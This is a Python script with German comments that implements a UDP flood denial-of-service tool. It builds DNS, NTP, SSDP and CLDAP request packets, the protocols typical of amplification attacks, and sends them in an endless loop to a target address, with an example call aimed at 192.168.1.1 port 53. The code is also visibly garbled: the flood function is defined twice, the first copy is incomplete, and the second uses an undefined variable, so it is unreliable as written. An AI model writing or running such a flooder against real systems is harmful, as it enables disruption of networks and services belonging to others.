import socket
import random
import threading

packet_counter = 0
stop_event = threading.Event()

def udp_flood(ip, port, packet_size, protocol="generic"):
    """Sendet UDP-Pakete für ein spezifisches Protokoll."""
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
        except:
            pass
    
    if protocol == "generic":
        udp_bytes = random._urandom(packet_size)
    elif protocol == "dns":
        udp_bytes = build_dns_packet()
    elif protocol == "ntp":
        udp_bytes = build_ntp_packet()
    elif protocol == "ssdp":
        udp_bytes = build_ssdp_packet()
    elif protocol == "cldap":
        udp_bytes = build_cldap_packet()
    else:
        print(f"Unbekanntes Protokoll: {protocol}")
        return

    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
        except:
            pass

def build_dns_packet():
    """Erstellt ein DNS-Abfragepaket."""
    transaction_id = random.randint(0, 65535).to_bytes(2, byteorder="big")
    flags = b'\x01\x00'  # Standard-DNS-Abfrage
    questions = b'\x00\x01'  # 1 Frage
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    query = b'\x07example\x03com\x00'  # "example.com"
    query_type = b'\x00\x01'  # A-Record
    query_class = b'\x00\x01'  # IN (Internet)
    dns_packet = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + query_type + query_class
    return dns_packet

def build_ntp_packet():
    """Erstellt ein NTP-Paket."""
    ntp_packet = b'\x1b' + 47 * b'\x00'  # Standard-NTP-Request
    return ntp_packet

def build_ssdp_packet():
    """Erstellt ein SSDP-Paket."""
    ssdp_packet = (
        b"M-SEARCH * HTTP/1.1\r\n"
        b"HOST: 239.255.255.250:1900\r\n"
        b"MAN: \"ssdp:discover\"\r\n"
        b"MX: 1\r\n"
        b"ST: ssdp:all\r\n"
        b"\r\n"
    )
    return ssdp_packet

def build_cldap_packet():
    """Erstellt ein CLDAP-Paket."""
    cldap_packet = (
        b'\x30\x84\x00\x00\x00\x2f\x02\x01\x01\x63\x84\x00\x00\x00\x25\x04\x00'
        b'\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b'
        b'\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'
    )
    return cldap_packet

# Beispielhafter Aufruf
try:
    # Starte einen Flood mit einem spezifischen Protokoll (z. B. DNS)
    flood_thread = threading.Thread(target=udp_flood, args=("192.168.1.1", 53, 128, "dns"))
    flood_thread.start()

    # Stoppe den Flood nach 10 Sekunden
    threading.Timer(10, stop_event.set).start()
    flood_thread.join()
except KeyboardInterrupt:
    stop_event.set()
    print("Flood gestoppt.")
